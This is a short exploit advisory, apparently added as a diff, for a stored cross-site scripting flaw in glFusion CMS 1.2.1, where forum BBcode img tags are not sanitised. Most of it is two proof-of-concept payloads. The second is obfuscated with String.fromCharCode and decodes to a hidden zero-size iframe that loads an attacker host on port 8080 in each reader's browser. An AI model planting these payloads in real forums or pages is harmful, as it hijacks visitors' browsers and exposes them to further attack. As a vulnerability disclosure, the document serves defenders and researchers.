@@ -1,0 +1,36 @@
+# Exploit Title: glfusion CMS 1.2.1 stored XSS via img tag
+# Date: 14-1-2010
+# Author: Saif El-Sherei
+# Software Link:
+www.glfusion.org/filemgmt/viewcat.php?cid=1<http://php.opensourcecms.com/scripts/redirect/download.php?id=33>
+# Version: 1.2.1
+# Tested on: Firefox 3.0.15
+
+Info:
+*
+glFusion <http://www.glfusion.org/>* gives you the ability to easily create
+websites and online communities complete with add-ons like Forums,
+CAPTCHA/Spam filters, Calendars, File & Media Gallery management solutions,
+WYSIWYG editors, and MooTools AJAX support, all right out of the box.
+
+
+Details:
+
+Failure to sanitize the BBcode image tags in the forum posts allows attacker
+to perform XSS attacks. also noted that u can't inject any "src" attribute
+in the attack so we use the second POC.
+
+
+POC:
+
+[img w=30><script>alert(123);</script> h=30]images/help.png[/img]
+
+[img
+w=30><script>document.write(String.fromCharCode(60,105,102,114,97,109,101,32,115,114,99,61,34,104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,50,51,49,46,49,50,56,58,56,48,56,48,47,34,32,104,101,105,103,104,116,61,34,48,34,32,119,105,100,116,104,61,34,48,34,62));</script>
+h=30]x[/img]
+
+Regards,
+
+Saif El-Sherei
+
+OSCP
